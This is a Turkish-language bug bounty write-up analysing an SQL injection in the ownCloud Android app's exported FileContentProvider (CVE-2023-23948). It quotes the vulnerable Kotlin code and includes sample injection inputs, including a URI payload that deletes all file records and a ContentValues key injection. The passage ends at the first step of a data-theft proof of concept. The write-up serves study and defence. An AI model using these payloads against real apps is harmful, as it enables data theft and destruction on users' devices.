# Bug Bounty Rapor Analizi : ownCloud Android — FileContentProvider SQL Injection
 
![](/blogs/img/sql-rapor-analiz/owncloudlogo.png)
 
---
 
Bu yazıda, ownCloud Android uygulamasında keşfedilen ve CVE-2023–23948 olarak kayıtlara geçen SQL Injection zafiyetini, orijinal HackerOne raporunu temel alarak inceleyeceğiz. Zafiyet, uygulamanın veri yönetimi için kullandığı FileContentProvider bileşeninin exported=true olarak bırakılmasından kaynaklanıyor. Cihazdaki herhangi bir uygulama — hiçbir özel izin istemeden — bu bileşen üzerinden SQL Injection gerçekleştirebiliyor.
 
Rapor, GitHub Security Lab (GHSL) ekibinden Tony Torralba (@atorralba) tarafından hazırlanmış. GHSL, açık kaynak projelerde güvenlik araştırmaları yapan ve responsible disclosure süreçlerini yöneten bir ekip. Orijinal rapora HackerOne #1650264 üzerinden ulaşabilirsiniz.
 
## Hedef Uygulama: ownCloud Android
 
ownCloud, açık kaynaklı bir self-hosted dosya senkronizasyon ve paylaşım platformu. Temelde Dropbox veya Google Drive gibi servislerin, kullanıcının kendi sunucusunda barındırabildiği bir alternatifi olarak tanımlanabilir.
 
Uygulamanın Android tarafı, kullanıcıların sunucudaki dosyalarına mobil cihaz üzerinden erişmesini sağlıyor. Uygulama içerisinde veri yönetimi ve dosya bilgilerinin tutulması gibi işlemler için Android'in ContentProvider mekanizması aktif olarak kullanılıyor. Zafiyetin odak noktası da tam olarak bu bileşenin veriyi nasıl işlediği.
 
## Android Sandbox ve Exported Bileşenler
 
Android'de her uygulama bir sandbox içinde çalışır — bir uygulama, diğerinin verilerine, dosyalarına veya bileşenlerine doğrudan erişemez. Bu, Android'in temel güvenlik modelidir. Ancak bazı durumlarda uygulamalar birbirleriyle iletişim kurmak zorundadır: bir planlayıcı uygulamasının Google Takvim'deki etkinliklere erişmesi, bir dosya yöneticisinin bulut depolama uygulamasının verilerini listelemesi gibi.
 
Bir Android bileşeni (Activity, Service, BroadcastReceiver veya ContentProvider) AndroidManifest.xml dosyasında android:exported="true" olarak işaretlendiğinde, cihazdaki diğer uygulamalar bu bileşene erişebilir hale gelir. Bu kasıtlı bir tasarım kararıdır, uygulamalar arası iletişimi mümkün kılar. Ama güvenlik açısından kritik bir anlam taşır: exported=true demek, o bileşenin attack surface'e (saldırı yüzeyine) dahil olması demektir. Eğer exported bileşende yeterli güvenlik kontrolleri yoksa — permission tanımlı değilse, gelen veriler doğrulanmıyorsa — cihazdaki herhangi bir uygulama bu bileşeni kötüye kullanabilir.
 
## ContentProvider Nedir?
 
Android'de her uygulamanın kendi özel veritabanı vardır. Normalde hiçbir uygulama başka bir uygulamanın veritabanına erişemez. Ama bazen uygulamalar arasında veri paylaşmak gerekir — örneğin bir rehber uygulamasının kişi bilgilerini WhatsApp ile paylaşması gibi. İşte ContentProvider tam olarak bunu yapan Android bileşenidir.
 
ContentProvider'ı database ile dış dünya arasında bir abstraction layer olarak düşünebilirsiniz. Veritabanına doğrudan erişimi engelleyerek, verilerin kontrollü bir şekilde taşınmasını sağlayan standart bir interface sunar. Dört temel CRUD operasyonunu destekler:
 
- **Create** → insert() — Veritabanına yeni kayıt ekler
- **Read** → query() — Veritabanından veri okur
- **Update** → update() — Mevcut bir kaydı günceller
- **Delete** → delete() — Kayıt siler
 
Bu 4 metod, yazının geri kalanında sürekli karşınıza çıkacak.
 
## SQL Injection Neden Burada Mümkün?
 
SQL Injection, dışarıdan gelen verinin SQL komutunun yapısını değiştirebildiği durumlarda ortaya çıkar. ContentProvider bağlamında bu, dışarıdan gelen URI segmentleri, where koşulları veya ContentValues gibi parametrelerin yeterince doğrulanmadan SQL sorgularına yapıştırılması anlamına geliyor. Saldırı uzaktan (internetten) yapılmıyor — saldırganın kurbanın telefonuna zararlı bir uygulama yükletmesi gerekiyor. Ama bu uygulama hiçbir özel Android permission'ı istemiyor bile.
 
## Bölüm 1: Kaynak Kod İncelemesi — FileContentProvider.kt
 
Şimdi 1526 satırlık FileContentProvider.kt dosyasını bir code review yapıyormuş gibi baştan sona inceleyeceğiz. Her bölümde önce kodun ne yaptığını anlayacağız,sonra güvenlik açısından değerlendireceğiz.
 
### 1.1 Sınıf Tanımı ve Temel Yapı (Satır 79–83)
 
```kotlin
class FileContentProvider(val executors: Executors = Executors()) : ContentProvider() {
    private lateinit var dbHelper: DataBaseHelper
    private lateinit var uriMatcher: UriMatcher
```
 
FileContentProvider sınıfı, Android'in ContentProvider() sınıfını miras alıyor. Bu demek oluyor ki Android sistemi bu sınıfı bir veritabanı kapısı olarak tanıyacak. İki önemli değişken var:
 
- **dbHelper**: DataBaseHelper tipinde. SQLite veritabanına erişim sağlayan yardımcı sınıf. lateinit demek "şimdilik boş, sonra dolduracağım" anlamına geliyor — onCreate() metodunda initialize edilecek.
- **uriMatcher**: Gelen URI'yi analiz edip hangi tablo üzerinde işlem yapılacağını belirleyen mekanizma. Mesela content://authority/file/5 adresinin "tek bir dosya" anlamına geldiğini bu matcher anlıyor.
 
### 1.2 Manifest Konfigürasyonu — Başlangıç Noktası
 
Kaynak koda bakmadan önce, bu bileşenin AndroidManifest.xml'de nasıl tanımlandığına bakalım:
 
```xml
<provider
    android:name=".providers.FileContentProvider"
    android:authorities="@string/authority"
    android:enabled="true"
    android:exported="true"
    android:label="@string/sync_string_files"
    android:syncable="true" />
```
 
Orijinal rapor bu satırı AndroidManifest.xml:153 olarak referans veriyor ve şöyle diyor: "The FileContentProvider provider is exported... All tables in this content provider can be freely interacted with by other apps in the same device."
 
İki kritik sorun var: exported="true" ve hiçbir permission tanımı yok. Bu demek oluyor ki cihazdaki herhangi bir uygulama — zararlı olsun veya olmasın — FileContentProvider'ın tüm CRUD metodlarına sınırsız erişim elde ediyor. Saldırının ilk koşulu daha Manifest'te sağlanmış durumda.
 
### 1.3 URI Routing: onCreate() (Satır 280–301)
 
```kotlin
override fun onCreate(): Boolean {
    dbHelper = DataBaseHelper(context)
    val authority = context?.resources?.getString(R.string.authority)
    uriMatcher = UriMatcher(UriMatcher.NO_MATCH)
    uriMatcher.addURI(authority, null, ROOT_DIRECTORY)        // 3
    uriMatcher.addURI(authority, "file/", SINGLE_FILE)        // 1
    uriMatcher.addURI(authority, "file/#", SINGLE_FILE)       // 1
    uriMatcher.addURI(authority, "dir/", DIRECTORY)           // 2
    uriMatcher.addURI(authority, "dir/#", DIRECTORY)          // 2
    uriMatcher.addURI(authority, "shares/", SHARES)           // 4
    uriMatcher.addURI(authority, "shares/#", SHARES)          // 4
    uriMatcher.addURI(authority, "capabilities/", CAPABILITIES) // 5
    uriMatcher.addURI(authority, "capabilities/#", CAPABILITIES) // 5
    uriMatcher.addURI(authority, "uploads/", UPLOADS)         // 6
    uriMatcher.addURI(authority, "uploads/#", UPLOADS)        // 6
    uriMatcher.addURI(authority, "cameraUploadsSync/", CAMERA_UPLOADS_SYNC) // 7
    uriMatcher.addURI(authority, "cameraUploadsSync/#", CAMERA_UPLOADS_SYNC) // 7
    uriMatcher.addURI(authority, "quotas/", QUOTAS)           // 8
    uriMatcher.addURI(authority, "quotas/#", QUOTAS)          // 8
    return true
}
```
 
Companion object'te (Satır 1354–1365) bu sabitlerin tanımlarını görüyoruz:
 
```kotlin
private const val SINGLE_FILE = 1
private const val DIRECTORY = 2
private const val ROOT_DIRECTORY = 3
private const val SHARES = 4
private const val CAPABILITIES = 5
private const val UPLOADS = 6
private const val CAMERA_UPLOADS_SYNC = 7
private const val QUOTAS = 8
```
 
Her URI pattern'i bir tamsayı sabitiyle eşleştiriliyor. "file/" ve "file/#" iki ayrı pattern olarak kayıtlı. Buradaki # işareti "burada bir sayı olacak" demek.
 
Ama çok kritik bir güvenlik noktası var: # sadece UriMatcher'ın eşleştirme kuralıdır — gelen değerin gerçekten sayı olduğunu doğrulamaz. file/5 de file/1 OR 1=1 de aynı SINGLE_FILE olarak eşleşir. UriMatcher bir input validation mekanizması değildir. Bu sadece routing içindir. Bu detay, ileride göreceğimiz URI injection zafiyetlerinin temel nedeni.
 
### 1.4 Veritabanı Yapısı: Tablo Tanımları (Satır 1047–1194)
 
Code review'da veritabanı şemasını anlamak kritik. createFilesTable() (Satır 1047) ile başlayalım:
 
```kotlin
private fun createFilesTable(db: SQLiteDatabase) {
    db.execSQL(
        "CREATE TABLE " + ProviderTableMeta.FILE_TABLE_NAME + "(" +
            ProviderTableMeta._ID + " INTEGER PRIMARY KEY, " +
            ProviderTableMeta.FILE_NAME + " TEXT, " +
            ProviderTableMeta.FILE_PATH + " TEXT, " +
            ProviderTableMeta.FILE_PARENT + " INTEGER, " +
            ProviderTableMeta.FILE_CREATION + " INTEGER, " +
            // ... diğer kolonlar ...
            ProviderTableMeta.FILE_PRIVATE_LINK + " TEXT );"
    )
}
```
 
Dikkat çekici şey: _ID hariç hiçbir kolonda NOT NULL kısıtlaması yok. FILE_NAME, FILE_PATH, FILE_ACCOUNT_OWNER gibi kritik alanlar NULL olabiliyor — veri bütünlüğü açısından zayıf bir tasarım. Ayrıca capabilities, uploads, camera_uploads_sync, user_quotas, user_avatars ve ocshares tabloları da benzer şekilde tanımlanmış.
 
Bu tablolar PoC exploit'lerinde doğrudan hedef alınacak — özellikle files tablosunun path kolonu, çalınan veriyi taşımak için kullanılacak.
 
### 1.5 Projection Map'ler (Satır 1367–1523)
 
```kotlin
private val fileProjectionMap = HashMap<String, String>()
init {
    fileProjectionMap[ProviderTableMeta._ID] = ProviderTableMeta._ID
    fileProjectionMap[ProviderTableMeta.FILE_PARENT] = ProviderTableMeta.FILE_PARENT
    fileProjectionMap[ProviderTableMeta.FILE_NAME] = ProviderTableMeta.FILE_NAME
    // ... her izin verilen kolon tek tek listeleniyor ...
}
```
 
Dosyada fileProjectionMap, shareProjectionMap, capabilityProjectionMap, uploadProjectionMap, cameraUploadSyncProjectionMap ve quotaProjectionMap olmak üzere 6 ayrı projection map tanımlı. Her biri, ilgili tablo için izin verilen kolon isimlerinin whitelist'i.
 
query() metodunda sqlQuery.isStrict = true ile birlikte kullanıldığında, saldırganın projection parametresi üzerinden SQL injection yapması engelleniyor. Orijinal rapor da bunu teyit ediyor: "note that projection is safe because of the use of a projection map"
 
Bu, dosyadaki tek düzgün çalışan savunma mekanizması. Ama maalesef sadece projection parametresini koruyor — WHERE koşulundaki, URI segment'lerdeki ve ContentValues key'lerindeki injection'ları engellemez şekilde bırakılmış.
 
### 1.6 Yetersiz Güvenlik Kontrolü — Tekrar Eden Pattern
 
Her CRUD metodunun private versiyonunun başında aynı kontrol tekrarlanıyor. Bunu ilk olarak delete() metodunda görelim (Satır 102–105):
 
```kotlin
private fun delete(db: SQLiteDatabase, uri: Uri, where: String?, whereArgs: Array<String>?): Int {
    if (where != null && whereArgs == null) {
        throw IllegalArgumentException("Selection not allowed, use parameterized queries")
    }
```
 
Aynı kontrol query() (Satır 311–313) ve update() (Satır 465–467) metodlarında da var. Geliştirici burada iyi niyetli bir güvenlik kontrolü denemiş: "Eğer where koşulu varsa ama whereArgs yoksa, izin verme" diyor. Bu iki açıdan yetersiz:
 
1. **URI'yi kapsamıyor**: Asıl zafiyet uri.pathSegments[1] üzerinden geliyor ve bu kontrol URI'yi hiç kontrol etmiyor. URI'den gelen değer bu kontrolü tamamen bypass ediyor.
2. **Kolayca bypass ediliyor**: Saldırgan whereArgs olarak boş olmayan bir array gönderip (new String[]{"a"}) where parametresine istediği SQL kodunu enjekte edebilir. Kontrol yalnızca where != null VE whereArgs == null durumunu yakalıyor.
 
Bu, false sense of security olarak bilinen duruma bir örnektir — kısmi bir kontrol, geliştiriciye "burası güvende" yanılgısı verir.
 
## Bölüm 2: CRUD Metodlarındaki Zafiyetler
 
Kaynak kodu incelediğimize göre, şimdi orijinal raporun tespit ettiği her injection noktasını kaynak kodla eşleştirelim. Rapor, ContentProvider'ın 4 CRUD metodunun her birini ayrı ayrı analiz etmiş.
 
### 2.1 delete() Metodu — 7 Injection Noktası
 
Orijinal rapor şöyle başlıyor: "User input enters the content provider through the three parameters of this method: uri, where, whereArgs"
 
Yani delete() metodunun 3 parametresinin hepsi potansiyel saldırı girdisi. Public delete() metodu (Satır 85–100) transaction yönetimi yapıp gerçek işi private versiyona devrediyor:
 
```kotlin
override fun delete(uri: Uri, where: String?, whereArgs: Array<String>?): Int {
    val count: Int
    val db = dbHelper.writableDatabase
    db.beginTransaction()
    try {
        count = delete(db, uri, where, whereArgs)
        db.setTransactionSuccessful()
    } finally {
        db.endTransaction()
    }
    context?.contentResolver?.notifyChange(uri, null)
    return count
}
```
 
dbHelper.writableDatabase ile yazılabilir veritabanı bağlantısı alınıyor — hem okuma hem silme/ekleme/güncelleme yapılabilir demek. Transaction "ya hep ya hiç" mantığında çalışır: içindeki tüm işlemler başarılıysa commit edilir (setTransactionSuccessful), değilse hepsi geri alınır. finally bloğu, hata olsa bile transaction'ı kapatmayı garanti eder. notifyChange ile "veritabanı değişti" sinyali gönderiliyor ki veriyi dinleyen UI bileşenleri ekranı güncelleyebilsin.
 
Şimdi zafiyetlerin yaşandığı private delete() metoduna (Satır 102–173) bakalım:
 
#### Injection 1–2: SINGLE_FILE ve DIRECTORY — URI Path Segment Injection
 
```kotlin
SINGLE_FILE -> {
    val c = query(uri, null, where, whereArgs, null)
    var remoteId: String? = ""
    if (c.moveToFirst()) {
        remoteId = c.getStringFromColumnOrThrow(ProviderTableMeta.FILE_REMOTE_ID)
        c.close()
    }
    Timber.d("Removing FILE $remoteId")
    count = db.delete(
        ProviderTableMeta.FILE_TABLE_NAME,
        ProviderTableMeta._ID + "=" + uri.pathSegments[1] +     // ← ZAFİYET #1
            if (!TextUtils.isEmpty(where))
                " AND ($where)"                                   // ← ZAFİYET #2
            else "", whereArgs
    )
}
```
 
Satır 121'e dikkat: uri.pathSegments[1] değeri doğrudan SQL string'ine string concatenation (+) ile ekleniyor. Hiçbir sanitization, validation veya parameterized query yok.
 
Normalde bir ContentProvider'a content://com.owncloud.android/file/5 gibi bir URI gönderilir. Burada 5 kısmı uri.pathSegments[1] ile alınır ve bir sayı olmalıdır. Ama hatırlayın: UriMatcher'ın # pattern'i bunu doğrulamıyor. Saldırgan buraya SQL kodu gönderebilir.
 
Bir saldırgan şu URI'yi gönderdiğinde:
 
```
content://com.owncloud.android/file/1 OR 1=1 --
```
 
Oluşan SQL:
 
```sql
DELETE FROM files WHERE _id = 1 OR 1=1 --
```
 
1=1 her zaman doğru olduğundan tablodaki TÜM dosya kayıtları silinir. -- ise SQL'de yorum işareti — sonraki her şeyi devre dışı bırakır.
 
İkinci injection noktası where parametresi: " AND ($where)" kısmı da dışarıdan geliyor. Parantez içine alınmış olması onu güvenli yapmıyor. Saldırgan where parametresine "1=1) OR (1=1" gibi bir değer gönderirse, parantezleri kırıp SQL yapısını değiştirebilir.
 
Aynı pattern DIRECTORY bloğunda (Satır 152–160) da birebir tekrarlanıyor:
 
```kotlin
DIRECTORY -> {
    // ... recursive silme ...
    count += db.delete(
        ProviderTableMeta.FILE_TABLE_NAME,
        ProviderTableMeta._ID + "=" + uri.pathSegments[1] +  // ← AYNI ZAFİYET
            if (!TextUtils.isEmpty(where))
                " AND ($where)"
            else "", whereArgs
    )
}
```
 
#### Injection 3–7: where Parametresi ile Doğrudan Injection
 
```kotlin
ROOT_DIRECTORY ->
    count = db.delete(ProviderTableMeta.FILE_TABLE_NAME, where, whereArgs)
CAPABILITIES ->
    count = db.delete(ProviderTableMeta.CAPABILITIES_TABLE_NAME, where, whereArgs)
UPLOADS ->
    count = db.delete(ProviderTableMeta.UPLOADS_TABLE_NAME, where, whereArgs)
CAMERA_UPLOADS_SYNC ->
    count = db.delete(ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, where, whereArgs)
QUOTAS ->
    count = db.delete(ProviderTableMeta.USER_QUOTAS_TABLE_NAME, where, whereArgs)
```
 
Orijinal rapor bu 5 satırın her birini // injection olarak işaretlemiş. İlk bakışta "where ve whereArgs birlikte gidiyor, bu parameterized query değil mi?" diye düşünebilirsiniz. Ama dikkat: where parametresinin içeriği dışarıdan geliyor! Android ContentProvider API'sinde where parametresi bir SQL WHERE cümlesidir. Normalde geliştiriciler ? yer tutucuları kullanmalı, ama ContentProvider'ın doğası gereği where string'i dışarıdan gelen uygulamadan alınır. Eğer ContentProvider exported ise, saldırgan bu string'e istediğini yazabilir.
 
Satır 103'teki kontrol (where != null && whereArgs == null) sadece whereArgs'ın null olma durumunu kontrol ediyor. Saldırgan whereArgs olarak boş olmayan bir array gönderip where parametresine SQL kodu enjekte edebilir.
 
Dikkat edilmesi gereken bir ayrıntı: SHARES bloğunda db.delete() yerine Room DAO kullanılıyor:
 
```kotlin
SHARES -> count =
    OwncloudDatabase.getDatabase(MainApp.appContext).shareDao().deleteShare(uri.pathSegments[1])
```
 
Room, Android'in modern ORM kütüphanesi ve sorguları derleme zamanında kontrol eder — bu yüzden SHARES'in delete işlemi güvenli. Ama bu tutarlılık diğer tablolara taşınmamış.
 
### 2.2 insert() Metodu — ContentValues Key Injection
 
Orijinal rapor şöyle diyor: "The values parameter reaches the following dangerous arguments without sanitization."
 
Public insert() metodu (Satır 183–195) yine transaction wrapper'ı ile çalışıyor ve gerçek işi private versiyona devrediyor. Private insert() metodu (Satır 197–278):
 
```kotlin
private fun insert(db: SQLiteDatabase, uri: Uri, values: ContentValues?): Uri {
    when (uriMatcher.match(uri)) {
        ROOT_DIRECTORY, SINGLE_FILE -> {
            val remotePath = values?.getAsString(ProviderTableMeta.FILE_PATH)
            val accountName = values?.getAsString(ProviderTableMeta.FILE_ACCOUNT_OWNER)
            val projection = arrayOf(ProviderTableMeta._ID, ProviderTableMeta.FILE_PATH,
                ProviderTableMeta.FILE_ACCOUNT_OWNER)
            val where = "${ProviderTableMeta.FILE_PATH}=? AND ${ProviderTableMeta.FILE_ACCOUNT_OWNER}=?"
            val whereArgs = arrayOf<String>()
            // ...
            val doubleCheck = query(uri, projection, where, whereArgs, null)
            return if (!doubleCheck.moveToFirst()) {
                doubleCheck.close()
                val fileId = db.insert(ProviderTableMeta.FILE_TABLE_NAME, null, values)  // injection
                // ...
            }
        }
        CAPABILITIES -> {
            val capabilityId = db.insert(ProviderTableMeta.CAPABILITIES_TABLE_NAME, null, values)  // injection
            // ...
        }
        UPLOADS -> {
            val uploadId = db.insert(ProviderTableMeta.UPLOADS_TABLE_NAME, null, values)  // injection
            // ...
        }
        CAMERA_UPLOADS_SYNC -> {
            val cameraUploadId = db.insert(
                ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, null, values  // injection
            )
            // ...
        }
        QUOTAS -> {
            val quotaId = db.insert(
                ProviderTableMeta.USER_QUOTAS_TABLE_NAME, null, values  // injection
            )
            // ...
        }
    }
}
```
 
Burada ilginç bir detay var: Satır 204'te where koşulunda ? yer tutucular kullanılmış — doğru yöntem, parameterized query. Bu, geliştirici ekibinin güvenli sorgu yazma konusunda farkındalığı olduğunu gösteriyor. Ama aynı metod, values parametresini hiç doğrulamadan db.insert()'e geçiyor.
 
ContentValues'in gizli tehlikesi nedir? ContentValues bir key-value yapısı. Key'ler kolon adları, value'lar ise veriler. Normalde value'lar güvenlidir çünkü Android bunları parameterized query'ye çevirir. Ama key'ler (kolon adları) doğrudan SQL string'ine yazılır ve escape edilmez.
 
Saldırgan şöyle bir ContentValues oluşturabilir:
 
```java
ContentValues values = new ContentValues();
values.put("normal_column", "normal_value");
values.put("etag=?,path=(SELECT password FROM secret_table) --", "a");
```
 
Android, ContentValues'i SQL'e çevirirken oluşan INSERT:
 
```sql
INSERT INTO files (normal_column, etag=?,path=(SELECT password FROM secret_table) --)
VALUES (?, ?)
```
 
Key kısmı escape edilmeden doğrudan SQL'e girmiş durumda! Bu çok güzel bir vektör çünkü çoğu geliştirici ContentValues'in tamamen güvenli olduğunu varsayar. Raporun ana PoC exploit'i tam olarak bu tekniği kullanıyor — birazdan göreceğiz.
 
Orijinal raporun remediation bölümü bu konuda açık: "This includes the keys in ContentValues objects, since those are used as column names in insert and update calls."
 
> **ContentValues Key Injection Dersi:** ContentValues'in value'ları güvenlidir (parameterized). Ama key'leri (kolon adları) escape edilmez ve doğrudan SQL'e yazılır. Exported ContentProvider'larda bu, ciddi bir injection vektörüdür.
 
### 2.3 query() Metodu — Selection, SortOrder ve URI Injection
 
Orijinal rapor: "User input enters the content provider through the five parameters of this method"
 
query() metodu (Satır 304–404) 5 parametre alıyor ve bunlardan projection güvenli, ama selection, sortOrder ve URI segment'leri tehlikeli:
 
```kotlin
override fun query(
    uri: Uri,
    projection: Array<String>?,
    selection: String?,
    selectionArgs: Array<String>?,
    sortOrder: String?
): Cursor {
    if (selection != null && selectionArgs == null) {
        throw IllegalArgumentException("Selection not allowed, use parameterized queries")
    }
    val db: SQLiteDatabase = dbHelper.writableDatabase
    val sqlQuery = SQLiteQueryBuilder()
    sqlQuery.isStrict = true
    sqlQuery.tables = ProviderTableMeta.FILE_TABLE_NAME
```
 
isStrict = true iyi bir güvenlik ayarı. Strict modda SQLiteQueryBuilder, projection map'te olmayan kolonlara erişimi engeller. Ama appendWhere üzerinden gelen injection'ları çözmez.
 
#### appendWhere() ile URI Injection
 
```kotlin
DIRECTORY -> {
    val folderId = uri.pathSegments[1]
    sqlQuery.appendWhere(
        ProviderTableMeta.FILE_PARENT + "=" + folderId          // ← ZAFİYET
    )
    sqlQuery.projectionMap = fileProjectionMap
}
SINGLE_FILE -> {
    if (uri.pathSegments.size > 1) {
        sqlQuery.appendWhere(
            ProviderTableMeta._ID + "=" + uri.pathSegments[1]   // ← ZAFİYET
        )
    }
    sqlQuery.projectionMap = fileProjectionMap
}
```
 
uri.pathSegments[1] değeri folderId değişkenine atanıyor ve doğrudan appendWhere içinde SQL string'ine yapıştırılıyor. Saldırgan URI üzerinden SQL kodu enjekte edebilir.
 
Aynı pattern UPLOADS (Satır 362–367), CAMERA_UPLOADS_SYNC (Satır 369–374) ve QUOTAS (Satır 376–381) bloklarının hepsinde tekrarlanıyor:
 
```kotlin
UPLOADS -> {
    sqlQuery.tables = ProviderTableMeta.UPLOADS_TABLE_NAME
    if (uri.pathSegments.size > 1) {
        sqlQuery.appendWhere(ProviderTableMeta._ID + "=" + uri.pathSegments[1])  // ← ZAFİYET
    }
    sqlQuery.projectionMap = uploadProjectionMap
}
```
 
#### Tutarsız Güvenlik Uygulaması: CAPABILITIES Bloğu
 
Ama şimdi çok ilginç bir detaya bakalım (Satır 355–361):
 
```kotlin
CAPABILITIES -> {
    sqlQuery.tables = ProviderTableMeta.CAPABILITIES_TABLE_NAME
    if (uri.pathSegments.size > 1) {
        sqlQuery.appendWhereEscapeString(
            ProviderTableMeta._ID + "=" + uri.pathSegments[1]
        )
    }
    sqlQuery.projectionMap = capabilityProjectionMap
}
```
 
Dikkat: burada appendWhere yerine appendWhereEscapeString kullanılmıştır. Bu metod, gelen string'i tek tırnak içine alıp escape eder. Bu, geliştirici ekipten birinin SQL Injection riskinin farkında olduğunu gösteriyor. Ama maalesef sadece CAPABILITIES bloğuna uygulamışlar — diğer tüm bloklar güvensiz kalmış.
 
Bu, code review'da çok sık karşılaşılan bir durumdur; inconsistent security controls . Bir güvenlik kontrolü ya her yere uygulanmalıdır ya da hiçbir yere.
 
#### SHARES Bloğu: selection ve sortOrder Injection
 
```kotlin
SHARES -> {
    val supportSqlQuery = SupportSQLiteQueryBuilder
        .builder(ProviderTableMeta.OCSHARES_TABLE_NAME)
        .columns(computeProjection(projection))
        .selection(selection, selectionArgs)                    // ← INJECTION
        .orderBy(
            if (TextUtils.isEmpty(sortOrder)) {
                sortOrder                                       // ← INJECTION
            } else {
                ProviderTableMeta.OCSHARES_DEFAULT_SORT_ORDER
            }
        ).create()
 
val newDb: SupportSQLiteDatabase =
        OwncloudDatabase.getDatabase(MainApp.appContext).openHelper.writableDatabase
    return newDb.query(supportSqlQuery)
}
```
 
**selection injection**: selection parametresi WHERE koşulunu oluşturuyor. Saldırgan buraya SQL subquery'ler enjekte edebilir. Raporun blind SQL injection PoC'si tam olarak bu noktayı hedef alıyor.
 
**sortOrder injection**: ORDER BY kısmına SQL enjekte etmek daha zor ama yine de mümkün. Saldırgan CASE WHEN (subquery) THEN column1 ELSE column2 END gibi bir yapı kullanarak blind injection yapabilir.
 
**Koddaki logic bug**: if (TextUtils.isEmpty(sortOrder)) koşuluna dikkat edersek, isEmpty true olduğunda (yani sortOrder boş olduğunda) sortOrder kullanılıyor. Bu bir logic bug — boş olan değeri kullanıyor. Muhtemelen koşul ters yazılmış (isEmpty yerine !isEmpty olmalıydı). Ama güvenlik açısından fark etmiyor çünkü her iki durumda da injection mümkün.
 
#### computeProjection() — Neden Projection Güvenli? (Satır 407–442)
 
```kotlin
private fun computeProjection(projectionIn: Array<String>?): Array<String?> {
    if (!projectionIn.isNullOrEmpty()) {
        val projection = arrayOfNulls<String>(projectionIn.size)
        for (i in 0 until projectionIn.size) {
            val userColumn = projectionIn[i]
            val column = shareProjectionMap[userColumn]
            if (column != null) {
                projection[i] = column
                continue
            }
            throw IllegalArgumentException("Invalid column " + projectionIn[i])
        }
        return projection
    }
    // ...
}
```
 
Bu fonksiyon, gelen her kolon adını shareProjectionMap'te arıyor. Eğer map'te yoksa IllegalArgumentException fırlatıyor. Bu, whitelist tabanlı doğrulama — SQL injection'a karşı en etkili savunma. Rapor da bunu teyit ediyor.
 
### 2.4 update() Metodu
 
Orijinal rapor: "The values and selection parameters reach the following dangerous arguments without sanitization."
 
update() metodu (Satır 458–486) en tehlikeli olanı. Neden? Çünkü hem ContentValues key injection (insert'teki gibi) hem de WHERE clause injection (delete'teki gibi) aynı anda mümkün:
 
```kotlin
private fun update(
    db: SQLiteDatabase, uri: Uri, values: ContentValues?,
    selection: String?, selectionArgs: Array<String>?
): Int {
    if (selection != null && selectionArgs == null) {
        throw IllegalArgumentException("Selection not allowed, use parameterized queries")
    }
    when (uriMatcher.match(uri)) {
        DIRECTORY -> return 0
        SHARES -> return values?.let {
            OwncloudDatabase.getDatabase(context!!).shareDao()
                .update(OCShareEntity.fromContentValues(it)).toInt()
        } ?: 0
        CAPABILITIES -> return db.update(
            ProviderTableMeta.CAPABILITIES_TABLE_NAME, values, selection, selectionArgs)  // injection
        UPLOADS -> {
            val ret = db.update(
                ProviderTableMeta.UPLOADS_TABLE_NAME, values, selection, selectionArgs)  // injection
            trimSuccessfulUploads(db)
            return ret
        }
        CAMERA_UPLOADS_SYNC -> return db.update(
            ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, values, selection, selectionArgs)  // injection
        QUOTAS -> return db.update(
            ProviderTableMeta.USER_QUOTAS_TABLE_NAME, values, selection, selectionArgs)  // injection
        else -> return db.update(
            ProviderTableMeta.FILE_TABLE_NAME, values, selection, selectionArgs)  // injection
    }
}
```
 
- **SHARES bloğu güvenli**: Room DAO kullanılıyor, derleme zamanı kontrol var.
- **DIRECTORY bloğu**: return 0 ile herhangi bir işlem yapılmıyor — yorum satırı (//updateFolderSize) işlevin devre dışı bırakıldığını gösteriyor.
- **Diğer tüm bloklar**: db.update() çağrısında hem values (ContentValues key injection) hem selection (WHERE injection) doğrulanmadan aktarılıyor.
 
Bu, saldırgana veritabanındaki herhangi bir satırı, herhangi bir değerle güncelleme yeteneği veriyor. Raporun ana PoC exploit'i tam olarak update() metodunu hedef alıyor.
 
### 1.7 Ek Gözlem: trimSuccessfulUploads() — rawQuery (Satır 1328–1352)
 
```kotlin
private fun trimSuccessfulUploads(db: SQLiteDatabase) {
    var c: Cursor? = null
    try {
        c = db.rawQuery(
            "delete from " + ProviderTableMeta.UPLOADS_TABLE_NAME +
                " where " + ProviderTableMeta.UPLOADS_STATUS + " == " +
                UploadsStorageManager.UploadStatus.UPLOAD_SUCCEEDED.value +
                " and " + ProviderTableMeta._ID +
                " not in (select " + ProviderTableMeta._ID +
                " from " + ProviderTableMeta.UPLOADS_TABLE_NAME +
                " where " + ProviderTableMeta.UPLOADS_STATUS + " == " +
                UploadsStorageManager.UploadStatus.UPLOAD_SUCCEEDED.value +
                " order by " + ProviderTableMeta.UPLOADS_UPLOAD_END_TIMESTAMP +
                " desc limit " + MAX_SUCCESSFUL_UPLOADS +
                ")", null
        )
        c!!.moveToFirst() // do something with the cursor, or deletion doesn't happen; true story
    } catch (e: Exception) {
        Timber.e(e, "Something wrong trimming successful uploads...")
    } finally {
        c?.close()
    }
}
```
 
rawQuery() doğrudan ham SQL çalıştırır. Bu spesifik durumda kullanıcı girdisi kullanılmıyor — tüm değerler sabit olduğu için doğrudan SQL Injection yok. Ama rawQuery kullanımı her zaman dikkatle incelenmeli: eğer ileride bu metoda kullanıcı girdisi eklenirse, anında zafiyet doğar.
 
İlginç bir Android quirk'ü de burada gizli: c!!.moveToFirst() satırı. Koddaki yorum çok açıklayıcı: "do something with the cursor, or deletion doesn't happen; true story." Android'in rawQuery ile DELETE çalıştırırken cursor okunmazsa silme işlemi gerçekleşmiyor — bir tür çalışıyorsa koda dokunma kısmı.
 
## Bölüm 3: PoC #1 — ContentValues Key Injection ile Veri Çalma
 
Kaynak kodu inceledik, zafiyetli noktaları tespit ettik. Şimdi araştırmacının bu zafiyetleri nasıl birleştirip çalışan bir exploit haline getirdiğini görelim.
 
Orijinal raporun bu bölümü şöyle başlıyor: "The following PoC demonstrates how a malicious application with no special permissions could extract information from any table in the filelist database."
 
Saldırı 4 adımda ilerliyor.
 
### Adım 1 — insert
 
```java
Uri result = ctx.getContentResolver().insert(
    Uri.parse("content://org.owncloud/file"),
    newOwncloudFile()
);
```
 
Saldırgan, ownCloud'un ContentProvider'ına yeni bir dosya kaydı ekliyor. Dönen result, eklenen kaydın URI'si — mesela "content://org.owncloud/file/42". Bu 42, kaydın _id'si.
 
